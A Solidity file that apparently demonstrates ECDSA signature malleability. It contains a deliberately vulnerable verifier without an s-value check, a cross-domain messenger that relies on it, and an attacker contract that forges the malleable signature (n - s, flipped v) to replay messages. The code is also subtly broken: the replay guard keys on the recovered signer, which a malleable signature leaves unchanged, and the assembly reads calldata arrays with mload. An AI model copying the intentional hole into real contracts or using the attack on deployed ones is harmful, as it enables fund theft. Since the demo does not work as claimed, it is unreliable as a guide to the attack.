// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

/**
 * @title VulnerableSignatureVerifier
 * @notice This contract demonstrates the ECDSA signature malleability vulnerability
 */
contract VulnerableSignatureVerifier {
    mapping(bytes32 => bool) public processedMessages;
    
    event MessageProcessed(bytes32 indexed messageHash, address signer);
    
    // VULNERABLE: Does not check s value in the ECDSA signature
    function processSignedMessage(
        bytes32 _messageHash,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        // Recover the address from the signature
        address signer = ecrecover(_messageHash, v, r, s);
        require(signer != address(0), "Invalid signature");
        
        // Check if we've already processed a message with this hash
        bytes32 fullHash = keccak256(abi.encodePacked(_messageHash, signer));
        require(!processedMessages[fullHash], "Message already processed");
        
        // Mark message as processed
        processedMessages[fullHash] = true;
        
        // Execute the signed action
        emit MessageProcessed(_messageHash, signer);
    }
}

/**
 * @title L2CrossDomainMessengerWithECRecover
 * @notice A cross-domain messenger that uses ECDSA signatures for authentication
 */
contract L2CrossDomainMessengerWithECRecover {
    VulnerableSignatureVerifier public verifier;
    
    event MessageSent(bytes32 indexed messageHash, address sender, address target);
    
    constructor(address _verifier) {
        verifier = VulnerableSignatureVerifier(_verifier);
    }
    
    // Sign messages to be sent cross-domain
    function sendCrossDomainMessage(
        address _target,
        bytes calldata _message,
        bytes calldata _signature
    ) external {
        // Create message hash
        bytes32 messageHash = keccak256(abi.encodePacked(
            _target,
            msg.sender,
            _message
        ));
        
        // Extract signature components
        require(_signature.length == 65, "Invalid signature length");
        bytes32 r;
        bytes32 s;
        uint8 v;
        
        assembly {
            r := mload(add(_signature, 32))
            s := mload(add(_signature, 64))
            v := byte(0, mload(add(_signature, 96)))
        }
        
        // VULNERABLE: The signature verification doesn't prevent malleability
        verifier.processSignedMessage(messageHash, v, r, s);
        
        emit MessageSent(messageHash, msg.sender, _target);
    }
}

/**
 * @title SignatureReplayAttacker
 * @notice Contract that demonstrates how to exploit signature malleability
 */
contract SignatureReplayAttacker {
    function performAttack(
        address _messenger,
        address _target,
        bytes calldata _message,
        bytes calldata _originalSignature
    ) external {
        // Extract original signature components
        require(_originalSignature.length == 65, "Invalid signature length");
        bytes32 r;
        bytes32 s;
        uint8 v;
        
        assembly {
            r := mload(add(_originalSignature, 32))
            s := mload(add(_originalSignature, 64))
            v := byte(0, mload(add(_originalSignature, 96)))
        }
        
        // Compute the malleable version of the signature
        // For a signature (v, r, s), the malleable version is (v^1, r, (curve.n - s) % curve.n)
        bytes32 malleableS = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));
        uint8 malleableV = v == 27 ? 28 : 27;
        
        // Create the malleable signature
        bytes memory malleableSignature = new bytes(65);
        assembly {
            mstore(add(malleableSignature, 32), r)
            mstore(add(malleableSignature, 64), malleableS)
            mstore8(add(malleableSignature, 96), malleableV)
        }
        
        // Replay the message with the malleable signature
        L2CrossDomainMessengerWithECRecover(_messenger).sendCrossDomainMessage(
            _target,
            _message,
            malleableSignature
        );
    }
}